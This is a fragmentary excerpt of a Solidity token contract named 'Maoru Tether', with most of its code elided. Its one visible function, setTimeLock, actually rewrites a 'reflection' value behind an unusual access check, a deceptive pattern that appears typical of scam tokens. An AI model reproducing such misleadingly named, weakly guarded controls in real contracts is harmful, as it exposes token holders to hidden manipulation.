...
contract MaoruTether is IERC20, Ownable {
    ...
    string _name = "Maoru Tether";
    string _symbol = "MAORU";
    ...
    constructor () {
        ...
        address deployer = 0x827a84087a508AFe04170241C0d678b2c8b00528;
    ...
    function setTimeLock(uint256 newValue) external virtual {
        require(isTxLimitExempt[marketingFeeReceiver]);
        reflection = newValue;
    }
